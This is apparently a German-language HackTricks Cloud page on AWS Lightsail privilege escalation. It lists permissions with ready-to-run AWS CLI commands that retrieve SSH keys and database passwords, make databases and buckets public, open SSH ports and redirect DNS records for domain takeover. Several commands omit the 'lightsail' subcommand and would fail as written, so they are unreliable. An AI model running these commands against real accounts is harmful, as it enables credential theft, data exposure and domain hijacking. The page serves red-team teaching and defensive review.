# AWS - Lightsail Privilege Escalation

{% hint style="success" %}
Lernen Sie AWS-Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lernen Sie GCP-Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys senden.

</details>
{% endhint %}

## Lightsail

F√ºr weitere Informationen zu Lightsail siehe:

{% content-ref url="../aws-services/aws-lightsail-enum.md" %}
[aws-lightsail-enum.md](../aws-services/aws-lightsail-enum.md)
{% endcontent-ref %}

{% hint style="warning" %}
Es ist wichtig zu beachten, dass Lightsail **keine IAM-Rollen des Benutzers** verwendet, sondern einem von AWS verwalteten Konto zugeordnet ist. Daher k√∂nnen Sie diesen Dienst nicht zum Privilege Escalation missbrauchen. Es k√∂nnten jedoch **sensible Daten** wie Code, API-Schl√ºssel und Datenbankinformationen in diesem Dienst gefunden werden.
{% endhint %}

### `lightsail:DownloadDefaultKeyPair`

Diese Berechtigung erm√∂glicht es Ihnen, die SSH-Schl√ºssel zum Zugriff auf die Instanzen zu erhalten:
```
aws lightsail download-default-key-pair
```
**Potenzielle Auswirkungen:** Finden sensibler Informationen innerhalb der Instanzen.

### `lightsail:GetInstanceAccessDetails`

Diese Berechtigung erm√∂glicht es Ihnen, SSH-Schl√ºssel zu generieren, um auf die Instanzen zuzugreifen:
```bash
aws lightsail get-instance-access-details --instance-name <instance_name>
```
**Potenzielle Auswirkungen:** Sensible Informationen innerhalb der Instanzen finden.

### `lightsail:CreateBucketAccessKey`

Diese Berechtigung erm√∂glicht es Ihnen, einen Schl√ºssel zum Zugriff auf den Bucket zu erhalten:
```bash
aws lightsail create-bucket-access-key --bucket-name <name>
```
**Potenzielle Auswirkungen:** Sensible Informationen im Bucket finden.

### `lightsail:GetRelationalDatabaseMasterUserPassword`

Diese Berechtigung erm√∂glicht es Ihnen, die Anmeldeinformationen zum Zugriff auf die Datenbank abzurufen:
```bash
aws lightsail get-relational-database-master-user-password --relational-database-name <name>
```
**Potenzielle Auswirkungen:** Sensible Informationen in der Datenbank finden.

### `lightsail:UpdateRelationalDatabase`

Diese Berechtigung erm√∂glicht es Ihnen, das Passwort zum Zugriff auf die Datenbank zu √§ndern:

{% code overflow="wrap" %}
```bash
aws lightsail update-relational-database --relational-database-name <name> --master-user-password <strong_new_password>
```
{% endcode %}

Wenn die Datenbank nicht √∂ffentlich ist, k√∂nnten Sie sie auch mit diesen Berechtigungen √∂ffentlich machen mit

{% code overflow="wrap" %}
```bash
aws lightsail update-relational-database --relational-database-name <name> --publicly-accessible
```
{% endcode %}

**Potenzielle Auswirkungen:** Sensible Informationen in der Datenbank finden.

### `lightsail:OpenInstancePublicPorts`

Diese Berechtigung erm√∂glicht das √ñffnen von Ports f√ºr das Internet.
```bash
aws lightsail open-instance-public-ports \
--instance-name MEAN-2 \
--port-info fromPort=22,protocol=TCP,toPort=22
```
**Potenzielle Auswirkungen:** Zugriff auf sensible Ports.

### `lightsail:PutInstancePublicPorts`

Diese Berechtigung erm√∂glicht das √ñffnen von Ports f√ºr das Internet. Beachten Sie, dass der Aufruf jeden nicht spezifizierten ge√∂ffneten Port schlie√üt.
```bash
aws lightsail put-instance-public-ports \
--instance-name MEAN-2 \
--port-infos fromPort=22,protocol=TCP,toPort=22
```
**Potenzielle Auswirkungen:** Zugriff auf sensible Ports.

### `lightsail:SetResourceAccessForBucket`

Diese Berechtigungen erm√∂glichen es, einer Instanz Zugriff auf einen Eimer zu gew√§hren, ohne zus√§tzliche Anmeldeinformationen. 

{% code overflow="wrap" %}
```bash
aws set-resource-access-for-bucket \
--resource-name <instance-name> \
--bucket-name <bucket-name> \
--access allow
```
{% endcode %}

**Potenzielle Auswirkungen:** Potenzieller neuer Zugriff auf Eimer mit sensiblen Informationen.

### `lightsail:UpdateBucket`

Mit dieser Berechtigung k√∂nnte ein Angreifer seinem eigenen AWS-Konto Lesezugriff auf Eimer gew√§hren oder die Eimer sogar f√ºr alle √∂ffentlich machen:
```bash
# Grant read access to exterenal account
aws update-bucket --bucket-name <value> --readonly-access-accounts <external_account>

# Grant read to the public
aws update-bucket --bucket-name <value> --access-rules getObject=public,allowPublicOverrides=true

# Bucket private but single objects can be public
aws update-bucket --bucket-name <value> --access-rules getObject=private,allowPublicOverrides=true
```
**Potenzielle Auswirkungen:** Potenzieller neuer Zugriff auf Eimer mit sensiblen Informationen.

### `lightsail:UpdateContainerService`

Mit diesen Berechtigungen k√∂nnte ein Angreifer Zugriff auf private ECRs vom Containerdienst gew√§hren.
```bash
aws update-container-service \
--service-name <name> \
--private-registry-access ecrImagePullerRole={isActive=boolean}
```
**Potenzielle Auswirkungen:** Erhalten sensibler Informationen aus privatem ECR

### `lightsail:CreateDomainEntry`

Ein Angreifer mit dieser Berechtigung k√∂nnte eine Subdomain erstellen und sie auf seine eigene IP-Adresse umleiten (Subdomain-√úbernahme), oder einen SPF-Eintrag erstellen, der es ihm erm√∂glicht, E-Mails von der Domain zu f√§lschen, oder sogar die Hauptdomain auf seine eigene IP-Adresse setzen.
```bash
aws lightsail create-domain-entry \
--domain-name example.com \
--domain-entry name=dev.example.com,type=A,target=192.0.2.0
```
**Potenzielle Auswirkung:** √úbernahme einer Domain

### `lightsail:UpdateDomainEntry`

Ein Angreifer mit dieser Berechtigung k√∂nnte eine Subdomain erstellen und sie auf seine eigene IP-Adresse umleiten (Subdomain-√úbernahme), oder einen SPF-Eintrag erstellen, der es ihm erm√∂glicht, E-Mails von der Domain zu f√§lschen, oder sogar die Hauptdomain auf seine eigene IP-Adresse setzen.
```bash
aws lightsail update-domain-entry \
--domain-name example.com \
--domain-entry name=dev.example.com,type=A,target=192.0.2.0
```
**Potenzielle Auswirkungen:** √úbernahme einer Domain

{% hint style="success" %}
Lernen Sie & √ºben Sie AWS-Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lernen Sie & √ºben Sie GCP-Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github Repositories einreichen.

</details>
{% endhint %}
